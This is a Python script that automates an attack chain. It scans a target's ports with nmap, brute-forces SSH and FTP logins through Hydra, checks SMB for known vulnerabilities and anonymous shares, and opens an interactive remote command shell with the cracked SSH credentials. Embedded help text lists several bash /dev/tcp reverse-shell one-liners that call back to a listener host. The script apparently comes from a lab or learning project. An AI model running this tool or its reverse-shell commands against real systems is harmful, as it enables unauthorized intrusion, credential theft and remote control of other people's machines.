import argparse
import paramiko
import nmap
import os
import pandas
from termcolor import colored
from tqdm import trange  
from time import sleep  

IP_ADDRESS = None
PORT = None
password_list = None 
username_list = None



#====================> SCANNING PORTS START <========================
#                   _                               _             
#  _ __   ___  _ __| |_   ___  ___ __ _ _ __  _ __ (_)_ __   __ _ 
# | '_ \ / _ \| '__| __| / __|/ __/ _` | '_ \| '_ \| | '_ \ / _` |
# | |_) | (_) | |  | |_  \__ \ (_| (_| | | | | | | | | | | | (_| |
# | .__/ \___/|_|   \__| |___/\___\__,_|_| |_|_| |_|_|_| |_|\__, |
# |_|                                                       |___/ 


def nmap_scanner(ip_address):
    scanner = nmap.PortScanner()
    print("\n> SCANNING STARTED\n")

    # Progress bar not required for functionality but I like the asthetics
    for i in trange(10, desc="Progress "):   
        sleep(0.2) 

    res = scanner.scan(ip_address, '1-500', arguments="-sS")
    
    # print(res) # Uncomment this to see the structure of data

    port_dict = scanner[IP_ADDRESS]["tcp"]  # ports dictionary just having ports and information about them

    
    # --------HERE FORMATTING TO PRINT A TABLE OF PORTS AND SERVICES-----------#
    temp = port_dict.keys()
    open_ports = dict()     # To store the ports and service identifier

    for i in port_dict:
        open_ports[port_dict[i]["name"]] = i

    port_data = {'Port': open_ports.values(), 'Service': open_ports.keys()}
    df_port_data = pandas.DataFrame(port_data) # Creating a dictionary with port number and services
    
    print('\n> SCANNING COMPLETED')
    print('\n> RESULTS:')
    print(df_port_data)
    #------------DONE WITH FORMATTING AND TABLE PRINTED ------------#
    
    # print(port_dict)
    decision_maker(port_dict)


#  ____                    ____                   
# / ___|  ___ __ _ _ __   |  _ \  ___  _ __   ___ 
# \___ \ / __/ _` | '_ \  | | | |/ _ \| '_ \ / _ \
#  ___) | (_| (_| | | | | | |_| | (_) | | | |  __/
# |____/ \___\__,_|_| |_| |____/ \___/|_| |_|\___|
#
#================> PORT SCANNING COMPLETED <==================                                              


#================> SSH FUNCTIONS START <======================
#          _        __                  _   _                 
#  ___ ___| |__    / _|_   _ _ __   ___| |_(_) ___  _ __  ___ 
# / __/ __| '_ \  | |_| | | | '_ \ / __| __| |/ _ \| '_ \/ __|
# \__ \__ \ | | | |  _| |_| | | | | (__| |_| | (_) | | | \__ \
# |___/___/_| |_| |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_|___/
                                                            

# Bruteforcing SSH Credentials using Hydra
def ssh_bruteforce2(path_userlist, path_passlist, port):
    cmd = "hydra ssh://{} -L {} -P {} -s {} -o succesful_attempts| >/dev/null".format(IP_ADDRESS, path_userlist, path_passlist, port)
    os.system(cmd)
    ssh_parse_creds(port)
    
 
# To extract credentials from the hydra output   
def ssh_parse_creds(port):
    with open('succesful_attempts', 'r') as file:
        creds_line = file.readlines()[-1]
        creds_list = creds_line.split()
        password = creds_list[-1]
        username = creds_list[-3]
        print(colored("\n[SUCCESS] ==> Username: {} ==> Password: {}".format(username, password), "blue"))
        ssh_connection(username, password,port)


# Function to try and connect to the ssh client
# If multi threading to be implemented. It will be better to pass just the username rather than the path to files
def ssh_connection(username, password, port):
    global IP_ADDRESS, PORT

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_client.connect(hostname=IP_ADDRESS, username=username, password=password, port=port)

        # To execute Commands:
        info = '''\nA reverse shell can be obtained by starting a netcat listener on your device and uploading a reverse shell to victims device.
Example: 
    > bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
    > 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
    > /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
            '''
        print(colored(info,'white'))
        print("\nA non persistent shell (-1 to exit): ")
        while(1):
            cmd = input("\n$ ")
            if cmd == '-1':
                break
            stdin, stdout, stderr = ssh_client.exec_command(cmd)
            output = stdout.readlines()
            print (colored(output, "yellow"))

    except paramiko.ssh_exception.AuthenticationException as raised_exception:
        print(colored("\n[FAILED]", "red"))
        if ssh_client:
            ssh_client.close()

    else:
        print(colored("\n[SUCCESS]", "green"))
        quit()  # Found the correct ID Password

#          _                      _ 
#  ___ ___| |__     ___ _ __   __| |
# / __/ __| '_ \   / _ \ '_ \ / _` |
# \__ \__ \ | | | |  __/ | | | (_| |
# |___/___/_| |_|  \___|_| |_|\__,_|
#
#=======================> SSH FUNCTIONS END <=======================


# ===============> FTP BRUTEFORCING <=====================
#  _____ _____ ____    ____             _        __                _             
# |  ___|_   _|  _ \  | __ ) _ __ _   _| |_ ___ / _| ___  _ __ ___(_)_ __   __ _ 
# | |_    | | | |_) | |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __| | '_ \ / _` |
# |  _|   | | |  __/  | |_) | |  | |_| | ||  __/  _| (_) | | | (__| | | | | (_| |
# |_|     |_| |_|     |____/|_|   \__,_|\__\___|_|  \___/|_|  \___|_|_| |_|\__, |
#                                                                          |___/ 

# Bruteforcing FTP Credentials using Hydra
def ftp_bruteforce2(path_userlist, path_passlist):
    cmd = "hydra ftp://{} -L {} -P {} -o succesful_attempts | &>/dev/null".format(IP_ADDRESS, path_userlist, path_passlist)
    os.system(cmd)
    ftp_parse_creds()
    
 
# To extract credentials from the hydra output   
def ftp_parse_creds():
    with open('succesful_attempts', 'r') as file:
        creds_line = file.readlines()[-1]
        creds_list = creds_line.split()
        password = creds_list[-1]
        username = creds_list[-3]
        print(colored("[SUCCESS] ==> Username: {} ==> Password: {}".format(username, password), "blue"))

#  _____ _____ ____    ____   ___  _   _ _____ 
# |  ___|_   _|  _ \  |  _ \ / _ \| \ | | ____|
# | |_    | | | |_) | | | | | | | |  \| |  _|  
# |  _|   | | |  __/  | |_| | |_| | |\  | |___ 
# |_|     |_| |_|     |____/ \___/|_| \_|_____|
                                             
# =============> DONE FTP BRUTEFORCING <=================


# =============> SMB BRUTEFORCING <=====================
#  ____  __  __ ____    ____ _____  _    ____ _____ 
# / ___||  \/  | __ )  / ___|_   _|/ \  |  _ \_   _|
# \___ \| |\/| |  _ \  \___ \ | | / _ \ | |_) || |  
#  ___) | |  | | |_) |  ___) || |/ ___ \|  _ < | |  
# |____/|_|  |_|____/  |____/ |_/_/   \_\_| \_\|_|  
                                                  
# Check SMB for possible vulnerabilities
def smb_scan(ip_address, port):
    msg = '''CHECKING FOR: 
                : cve-2017-7494
                : cve2009-3103
                : ms06-025
                : ms07-029
                : ms08-067
                : ms10-054
                : ms10-061
                : ms17-010
        '''
    cmd = "nmap --script smb-vuln* -p{} {} -oN nmap.smb_result | >/dev/null".format(port, ip_address)
    os.system(cmd)
    
    with open('nmap.smb_result', 'r') as smb_point:
        smb_data = smb_point.readlines()
        # print(smb_data)
        index_ = smb_data.index("Host script results:\n")
        print("\n")
        for i in smb_data[index_:-2]:
            print(i, end='')
    ## CHECKING AND LISTING ANONYMOUS SHARES
    print('\n> CHECKING FOR ANONYMOUS LOGIN AND ANY SHARES WE CAN ACCESS',end='\n\n')

    workgroup = input("Enter workgroup(default WORKGROUP): ")
  
    
    if workgroup == "":
        workgroup = "WORKGROUP"

    cmd = "smbclient -L \\{} -I {} -N".format(workgroup, ip_address) 
    os.system(cmd)

    # nmap --script smb-brute.nse -p445 <host>



#  ____  __  __ ____    _____ _   _ ____  
# / ___||  \/  | __ )  | ____| \ | |  _ \ 
# \___ \| |\/| |  _ \  |  _| |  \| | | | |
#  ___) | |  | | |_) | | |___| |\  | |_| |
# |____/|_|  |_|____/  |_____|_| \_|____/ 
# =============> END SMB BRUTEFORCING <=====================




# It redirects the flow to respective functions which are to be exploited
def decision_maker(port_dictionary):
    # Changing structure of dictionary such that dict[<service name>] = <port>
    changed_port_dict = dict()

    for i in port_dictionary:
        changed_port_dict[port_dictionary[i]['name']] = i

    # print(changed_port_dict)

    cmd = input("\nEnter the active services to be exploited: ")

    if cmd in changed_port_dict.keys():
        if cmd == 'ssh':
            ssh_bruteforce2(username_list.strip(), password_list.strip(), changed_port_dict[cmd])
        elif cmd == 'microsoft-ds':
            smb_scan(IP_ADDRESS, changed_port_dict[cmd])
        elif cmd == 'ftp':
            ftp_bruteforce2(username_list.strip(), password_list.strip(), changed_port_dict[cmd])

    else:
        print("> INVALID INPUT")


def parse_arguments():
    # To take the IP and PORT as inputs
    msg = """ 
    This script scans ports to detect active services and subsequently exploits them."""
    parser = argparse.ArgumentParser(description=msg, prog='SCANNER')

    parser.add_argument("-u", metavar="IP_ADDRESS", help="ip address")
    parser.add_argument("-p", metavar="PORT", help="port value", default=22, type=int)
    parser.add_argument("-uL", metavar="USERNAME LIST", help="path to file containing usernames")
    parser.add_argument("-uP", metavar="PASSWORD LIST", help="path to file containing passwords")
    parser.print_help()

    # args = parser.parse_args()
    return parser.parse_args()


def main():
    global IP_ADDRESS, PORT, username_list, password_list

    args = parse_arguments()  # Contains the command line arguments
    password_list = args.uP
    username_list = args.uL
    ip_address = args.u
    port = args.p

    IP_ADDRESS = ip_address
    #IP_ADDRESS = "192.168.1.3"  # Value set to test on Parrot VM Babayaga
    # PORT = 22

    # call to function which will connect with the ssh client
    # currently passing garbage value, to be changed later
    
    
    #ssh_bruteforce2(username_list.strip(), password_list.strip())
    nmap_scanner(IP_ADDRESS) 


if __name__ == "__main__":
    main()



